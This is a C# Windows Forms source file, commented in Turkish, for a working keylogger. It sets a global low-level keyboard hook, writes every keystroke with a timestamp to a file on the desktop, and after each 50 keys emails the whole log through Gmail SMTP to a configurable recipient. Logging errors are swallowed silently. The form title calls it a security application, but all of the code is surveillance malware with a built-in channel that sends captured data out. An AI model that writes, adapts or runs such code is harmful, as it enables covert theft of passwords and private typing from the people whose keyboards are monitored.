using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Threading;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        // Windows API fonksiyonları için gerekli tanımlamalar
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        
        // Hook prosedürü için delegate
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        // Hook handle
        private static IntPtr _hookID = IntPtr.Zero;
        
        // Hook prosedürü
        private LowLevelKeyboardProc _proc = HookCallback;
        
        // Log dosyası yolu
        private static string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "keylog.txt");
        
        // Email ayarları
        private static string smtpServer = "smtp.gmail.com";
        private static int smtpPort = 587;
        private static string senderEmail = "your-email@gmail.com"; // Buraya kendi emailini yaz
        private static string senderPassword = "your-app-password"; // Buraya app password yaz
        private static string recipientEmail = "recipient@gmail.com"; // Buraya alıcı email yaz
        
        // Tuş sayacı (kaç tuş basıldığında email gönderilecek)
        private static int keyCount = 0;
        private static int maxKeysBeforeEmail = 50; // 50 tuş basıldığında email gönder
        
        // Keylogger durumu
        private static bool isKeyloggerActive = false;
        
        // Form kontrolleri
        private Button btnToggle;
        private Label lblStatus;
        private TextBox txtSenderEmail;
        private TextBox txtSenderPassword;
        private TextBox txtRecipientEmail;
        private Label lblSenderEmail;
        private Label lblSenderPassword;
        private Label lblRecipientEmail;
        private Button btnSaveSettings;

        public Form1()
        {
            InitializeComponent();
            InitializeCustomControls();
            
            // Form ayarları
            this.Text = "Keylogger - Güvenlik Uygulaması";
            this.Size = new Size(400, 300);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            
            // Log dosyasını oluştur
            if (!File.Exists(logFilePath))
            {
                File.WriteAllText(logFilePath, "Keylogger başlatıldı: " + DateTime.Now.ToString() + Environment.NewLine);
            }
            
            UpdateStatus();
        }
        
        private void InitializeCustomControls()
        {
            // Toggle butonu
            btnToggle = new Button();
            btnToggle.Text = "Keylogger'ı Başlat";
            btnToggle.Size = new Size(150, 40);
            btnToggle.Location = new Point(125, 20);
            btnToggle.BackColor = Color.LightGreen;
            btnToggle.Click += BtnToggle_Click;
            this.Controls.Add(btnToggle);
            
            // Durum etiketi
            lblStatus = new Label();
            lblStatus.Text = "Durum: Kapalı";
            lblStatus.Size = new Size(200, 20);
            lblStatus.Location = new Point(100, 70);
            lblStatus.TextAlign = ContentAlignment.MiddleCenter;
            this.Controls.Add(lblStatus);
            
            // Email ayarları
            lblSenderEmail = new Label();
            lblSenderEmail.Text = "Gönderen Email:";
            lblSenderEmail.Size = new Size(100, 20);
            lblSenderEmail.Location = new Point(20, 110);
            this.Controls.Add(lblSenderEmail);
            
            txtSenderEmail = new TextBox();
            txtSenderEmail.Text = senderEmail;
            txtSenderEmail.Size = new Size(200, 20);
            txtSenderEmail.Location = new Point(130, 110);
            this.Controls.Add(txtSenderEmail);
            
            lblSenderPassword = new Label();
            lblSenderPassword.Text = "App Password:";
            lblSenderPassword.Size = new Size(100, 20);
            lblSenderPassword.Location = new Point(20, 140);
            this.Controls.Add(lblSenderPassword);
            
            txtSenderPassword = new TextBox();
            txtSenderPassword.Text = senderPassword;
            txtSenderPassword.Size = new Size(200, 20);
            txtSenderPassword.Location = new Point(130, 140);
            txtSenderPassword.PasswordChar = '*';
            this.Controls.Add(txtSenderPassword);
            
            lblRecipientEmail = new Label();
            lblRecipientEmail.Text = "Alıcı Email:";
            lblRecipientEmail.Size = new Size(100, 20);
            lblRecipientEmail.Location = new Point(20, 170);
            this.Controls.Add(lblRecipientEmail);
            
            txtRecipientEmail = new TextBox();
            txtRecipientEmail.Text = recipientEmail;
            txtRecipientEmail.Size = new Size(200, 20);
            txtRecipientEmail.Location = new Point(130, 170);
            this.Controls.Add(txtRecipientEmail);
            
            // Kaydet butonu
            btnSaveSettings = new Button();
            btnSaveSettings.Text = "Ayarları Kaydet";
            btnSaveSettings.Size = new Size(120, 30);
            btnSaveSettings.Location = new Point(140, 200);
            btnSaveSettings.Click += BtnSaveSettings_Click;
            this.Controls.Add(btnSaveSettings);
        }
        
        private void BtnToggle_Click(object sender, EventArgs e)
        {
            if (!isKeyloggerActive)
            {
                // Keylogger'ı başlat
                _hookID = SetHook(_proc);
                isKeyloggerActive = true;
                btnToggle.Text = "Keylogger'ı Durdur";
                btnToggle.BackColor = Color.LightCoral;
                UpdateStatus();
            }
            else
            {
                // Keylogger'ı durdur
                if (_hookID != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hookID);
                    _hookID = IntPtr.Zero;
                }
                isKeyloggerActive = false;
                btnToggle.Text = "Keylogger'ı Başlat";
                btnToggle.BackColor = Color.LightGreen;
                UpdateStatus();
            }
        }
        
        private void BtnSaveSettings_Click(object sender, EventArgs e)
        {
            senderEmail = txtSenderEmail.Text;
            senderPassword = txtSenderPassword.Text;
            recipientEmail = txtRecipientEmail.Text;
            
            MessageBox.Show("Ayarlar kaydedildi!", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        
        private void UpdateStatus()
        {
            if (isKeyloggerActive)
            {
                lblStatus.Text = "Durum: Aktif";
                lblStatus.ForeColor = Color.Red;
            }
            else
            {
                lblStatus.Text = "Durum: Kapalı";
                lblStatus.ForeColor = Color.Green;
            }
        }

        // Windows API fonksiyonları
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Hook kurulumu
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // Hook callback fonksiyonu - tuş basımlarını yakalar
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Sadece keylogger aktifken tuş basımlarını yakala
            if (isKeyloggerActive && nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyName = ((Keys)vkCode).ToString();
                
                // Tuş bilgisini log dosyasına yaz
                LogKey(keyName);
            }
            
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Tuş bilgisini log dosyasına yazan fonksiyon
        private static void LogKey(string keyName)
        {
            try
            {
                string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {keyName}" + Environment.NewLine;
                File.AppendAllText(logFilePath, logEntry);
                
                // Tuş sayacını artır
                keyCount++;
                
                // Belirli sayıda tuş basıldığında email gönder
                if (keyCount >= maxKeysBeforeEmail)
                {
                    SendEmail();
                    keyCount = 0; // Sayacı sıfırla
                }
            }
            catch (Exception ex)
            {
                // Hata durumunda sessizce devam et
            }
        }

        // Email gönderme fonksiyonu
        private static void SendEmail()
        {
            try
            {
                // Log dosyasını oku
                string logContent = File.ReadAllText(logFilePath);
                
                // Email oluştur
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(senderEmail);
                mail.To.Add(recipientEmail);
                mail.Subject = "Keylogger Raporu - " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                mail.Body = "Keylogger verileri:\n\n" + logContent;
                
                // SMTP istemcisi
                SmtpClient smtpClient = new SmtpClient(smtpServer, smtpPort);
                smtpClient.Credentials = new NetworkCredential(senderEmail, senderPassword);
                smtpClient.EnableSsl = true;
                
                // Email gönder
                smtpClient.Send(mail);
                
                // Log dosyasını temizle (isteğe bağlı)
                File.WriteAllText(logFilePath, "Email gönderildi: " + DateTime.Now.ToString() + Environment.NewLine);
            }
            catch (Exception ex)
            {
                // Email gönderme hatası
                File.AppendAllText(logFilePath, "Email gönderme hatası: " + ex.Message + Environment.NewLine);
            }
        }

        // Form kapatılırken hook'u temizle
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
            }
            base.OnFormClosing(e);
        }
    }
}
